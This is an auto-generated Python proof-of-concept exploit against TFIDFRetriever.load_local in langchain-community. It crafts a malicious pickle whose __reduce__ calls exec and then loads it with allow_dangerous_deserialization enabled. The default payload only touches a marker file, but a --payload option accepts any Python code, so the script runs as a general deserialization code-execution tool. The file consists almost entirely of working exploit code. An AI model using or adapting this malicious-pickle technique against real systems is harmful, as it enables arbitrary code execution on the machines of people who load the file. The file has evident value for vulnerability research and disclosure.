#!/usr/bin/env python3
# PoC for langchain-community-only (/tmp/langchain-community-only)
# Path: rce-018
# Sink: load_local
# Auto-generated — run with: python3 rce_function_load_local_uses_load_local_14.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for RCE in langchain-community-only's load_local function.

Vulnerability: The load_local function in TFIDFRetriever uses pickle.load on a file
whose path is constructed from user-controlled folder_path and file_name parameters.
Although there is an allow_dangerous_deserialization guard that must be set to True,
this guard is caller-controlled and does not prevent exploitation when set to True.
An attacker who can control folder_path and file_name can point to a malicious pickle
file, leading to arbitrary code execution.

This PoC demonstrates the vulnerability by:
1. Creating a malicious pickle file that executes a benign command (touch /tmp/poc_success.txt)
2. Hosting it at a controlled path
3. Calling load_local with allow_dangerous_deserialization=True and pointing to the malicious file

Usage:
    python poc.py [--target /path/to/malicious.pkl] [--folder /tmp/exploit]
"""

import os
import sys
import pickle
import tempfile
import argparse
import subprocess
from pathlib import Path

# Add the langchain-community-only path to sys.path for importing
sys.path.insert(0, "/tmp/langchain-community-only")

# Benign payload - creates a marker file to prove code execution
BENIGN_PAYLOAD = """
import os
os.system('touch /tmp/poc_success.txt')
print("[POC] Code execution achieved! Created /tmp/poc_success.txt")
"""

def create_malicious_pickle(output_path: str, payload_code: str = BENIGN_PAYLOAD) -> str:
    """
    Create a malicious pickle file that executes arbitrary code when loaded.
    
    Args:
        output_path: Path where the pickle file will be written
        payload_code: Python code to execute (default: benign touch command)
    
    Returns:
        Path to the created pickle file
    """
    class MaliciousPickle:
        """Class that executes code when unpickled via __reduce__"""
        def __reduce__(self):
            return (exec, (payload_code,))
    
    # Create the malicious pickle
    malicious_obj = MaliciousPickle()
    with open(output_path, 'wb') as f:
        pickle.dump(malicious_obj, f)
    
    print(f"[*] Created malicious pickle at: {output_path}")
    return output_path

def create_malicious_joblib(output_path: str) -> str:
    """
    Create a dummy joblib file (required by load_local but not the RCE vector).
    
    Args:
        output_path: Path where the joblib file will be written
    
    Returns:
        Path to the created joblib file
    """
    import joblib
    # Create a simple dummy object for joblib
    dummy_data = {"dummy": "data"}
    joblib.dump(dummy_data, output_path)
    print(f"[*] Created dummy joblib at: {output_path}")
    return output_path

def exploit_load_local(folder_path: str, file_name: str = "tfidf_vectorizer"):
    """
    Exploit the load_local function by pointing it to our malicious pickle.
    
    Args:
        folder_path: Directory containing the malicious files
        file_name: Base name for the files (default: tfidf_vectorizer)
    """
    from langchain_community.retrievers import TFIDFRetriever
    
    print(f"[*] Attempting to exploit load_local with:")
    print(f"    folder_path: {folder_path}")
    print(f"    file_name: {file_name}")
    print(f"    allow_dangerous_deserialization: True")
    
    try:
        # Call the vulnerable function with allow_dangerous_deserialization=True
        retriever = TFIDFRetriever.load_local(
            folder_path=folder_path,
            file_name=file_name,
            allow_dangerous_deserialization=True
        )
        print(f"[+] Successfully loaded retriever: {retriever}")
    except Exception as e:
        print(f"[!] Error during exploitation: {e}")
        # Even if the retriever loading fails, the pickle code may have executed
        print("[*] Note: The malicious pickle code may have executed before the error")

def main():
    parser = argparse.ArgumentParser(
        description="PoC for RCE in langchain-community load_local"
    )
    parser.add_argument(
        "--folder",
        default=None,
        help="Folder path to use for the exploit (default: temp directory)"
    )
    parser.add_argument(
        "--file-name",
        default="tfidf_vectorizer",
        help="File name base (default: tfidf_vectorizer)"
    )
    parser.add_argument(
        "--payload",
        default=BENIGN_PAYLOAD,
        help="Custom Python code to execute (default: touch /tmp/poc_success.txt)"
    )
    args = parser.parse_args()
    
    # Use a temporary directory if no folder specified
    if args.folder is None:
        exploit_dir = tempfile.mkdtemp(prefix="poc_exploit_")
    else:
        exploit_dir = args.folder
        os.makedirs(exploit_dir, exist_ok=True)
    
    print(f"[*] Using exploit directory: {exploit_dir}")
    
    # Create the malicious pickle file
    pickle_path = os.path.join(exploit_dir, f"{args.file_name}.pkl")
    create_malicious_pickle(pickle_path, args.payload)
    
    # Create a dummy joblib file (required by load_local)
    joblib_path = os.path.join(exploit_dir, f"{args.file_name}.joblib")
    create_malicious_joblib(joblib_path)
    
    # Execute the exploit
    exploit_load_local(exploit_dir, args.file_name)
    
    # Check if the benign payload executed
    marker_file = "/tmp/poc_success.txt"
    if os.path.exists(marker_file):
        print(f"\n[+] SUCCESS: Marker file {marker_file} was created!")
        print("[+] Code execution confirmed!")
        # Clean up the marker file
        os.remove(marker_file)
        print("[*] Cleaned up marker file")
    else:
        print(f"\n[-] Marker file {marker_file} was NOT found")
        print("[-] Code execution may have failed or been blocked")
    
    # Clean up temp directory if we created it
    if args.folder is None:
        import shutil
        shutil.rmtree(exploit_dir, ignore_errors=True)
        print(f"[*] Cleaned up temporary directory: {exploit_dir}")

if __name__ == "__main__":
    print("=" * 60)
    print("PoC: RCE in langchain-community load_local")
    print("=" * 60)
    print()
    
    # Verify the vulnerable code exists
    try:
        from langchain_community.retrievers import TFIDFRetriever
        print("[*] Found vulnerable module: langchain_community.retrievers.TFIDFRetriever")
    except ImportError as e:
        print(f"[!] Could not import vulnerable module: {e}")
        print("[!] Make sure /tmp/langchain-community-only is accessible")
        sys.exit(1)
    
    main()
